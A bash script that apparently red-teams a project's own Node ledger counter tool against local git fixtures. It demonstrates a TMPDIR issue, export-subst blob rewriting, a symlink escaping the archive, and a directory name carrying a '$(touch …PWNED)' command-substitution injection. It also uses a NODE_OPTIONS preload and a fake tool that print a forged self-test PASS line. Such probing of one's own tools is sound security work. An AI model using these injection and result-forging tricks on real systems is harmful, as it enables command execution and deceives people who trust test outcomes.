#!/usr/bin/env bash
# K66SentinelCounters attack part 1: TMPDIR, export-subst, symlink escape, lane-path shell injection, NODE_OPTIONS.
set -uo pipefail
S=/fast/scratch/hyaku/kumitate-r66/K66SentinelCounters
P=/home/vgpnk/Projects/shokunin/kumitate-shokunin/.ufo/waves/round-66/probe/ledger66-probe.mjs
LANE=/home/vgpnk/Projects/shokunin/kumitate-shokunin
BASE=8d557f85312de4fcc82e09ff735d21436bc3746d
mkdir -p "$S/t1" "$S/t2" "$S/t7"
echo "STRACE=$(command -v strace || echo none)"

echo "===== T1a os.tmpdir"
node -e "console.log('ambient:', require('node:os').tmpdir())"
TMPDIR="$S/t1" node -e "console.log('TMPDIR set:', require('node:os').tmpdir())"
env -u TMPDIR node -e "console.log('TMPDIR unset:', require('node:os').tmpdir())"

echo "===== T1b counter with TMPDIR pointing at a missing dir"
TMPDIR="$S/t1/nope" node "$P" "$LANE" "$BASE" >"$S/t1b.out" 2>"$S/t1b.err"
echo "exit=$?"
echo "-- stdout:"; cat "$S/t1b.out"
echo "-- stderr head:"; head -4 "$S/t1b.err"
echo "-- scratch dirs left:"; ls -d "$S"/t1/ledger66.* 2>/dev/null || echo "(none)"

echo "===== T4 git archive export-subst rewrites blob content"
F="$S/fx4"; rm -rf "$F"; git init -q "$F"
printf 'planned sha marker $Format:%%H$\n' > "$F/f.md"
printf 'f.md export-subst\n' > "$F/.gitattributes"
git -C "$F" add -A
git -C "$F" -c user.name=t -c user.email=t@invalid -c commit.gpgsign=false commit -q -m x
echo "tree blob:   $(git -C "$F" show HEAD:f.md)"
echo "archive out: $(git -C "$F" archive HEAD | tar -xO f.md)"
echo "attr mode:   $(git -C "$F" ls-tree -r HEAD | awk '{print $1, $4}' | tr '\n' ' ')"

echo "===== T2 symlink in a revision escapes the archive (L1 scores a host file)"
mkdir -p "$S/outside"
cat > "$S/outside/fake-tool.mjs" <<'EOF'
if (process.argv.includes('--selftest')) { console.log('ROUTED_LEDGER_SELFTEST: PASS (33/33)'); process.exit(0); }
process.exit(1);
EOF
F="$S/fx2"; rm -rf "$F"; git init -q "$F"; mkdir -p "$F/scripts" "$F/corpus/lessons"
ln -s "$S/outside/fake-tool.mjs" "$F/scripts/routed-ledger.mjs"
printf '# nothing\n' > "$F/corpus/routed-ledger.md"
git -C "$F" add -A
git -C "$F" -c user.name=t -c user.email=t@invalid -c commit.gpgsign=false commit -q -m x
echo "tree entry: $(git -C "$F" ls-tree -r HEAD | tr '\n' ' ; ')"
echo "readlink in archive: $(git -C "$F" archive HEAD | tar -xO scripts/routed-ledger.mjs)"
TMPDIR="$S/t2" node "$P" "$F" HEAD 2>&1 | tail -2
echo "exit=$?"

echo "===== T3 lane path reaches a bash -c string (command substitution)"
W="$S/lane\$(touch $S/PWNED)"; rm -rf "$W"; mkdir -p "$W"
git init -q "$W"; printf 'x\n' > "$W/f"; git -C "$W" add -A
git -C "$W" -c user.name=t -c user.email=t@invalid -c commit.gpgsign=false commit -q -m x
rm -f "$S/PWNED"
node "$P" "$W" HEAD 2>&1 | tail -1
echo "PWNED created? $([ -e "$S/PWNED" ] && echo YES || echo no)"

echo "===== T7 NODE_OPTIONS in the caller env reaches the archive tool (L1 forged)"
cat > "$S/t7/preload.mjs" <<'EOF'
const a = process.argv;
if (a[1] && a[1].endsWith('scripts/routed-ledger.mjs') && a.includes('--selftest')) {
  process.stdout.write('ROUTED_LEDGER_SELFTEST: PASS (33/33)\n');
  process.exit(0);
}
EOF
F="$S/fx7"; rm -rf "$F"; git init -q "$F"; mkdir -p "$F/scripts"
printf 'process.exit(3);\n' > "$F/scripts/routed-ledger.mjs"
git -C "$F" add -A
git -C "$F" -c user.name=t -c user.email=t@invalid -c commit.gpgsign=false commit -q -m x
echo "-- without preload:"; TMPDIR="$S/t7" node "$P" "$F" HEAD 2>&1 | tail -1 | cut -c1-200
echo "-- with NODE_OPTIONS=--require:"; NODE_OPTIONS="--require $S/t7/preload.mjs" TMPDIR="$S/t7" node "$P" "$F" HEAD 2>&1 | tail -1 | cut -c1-200
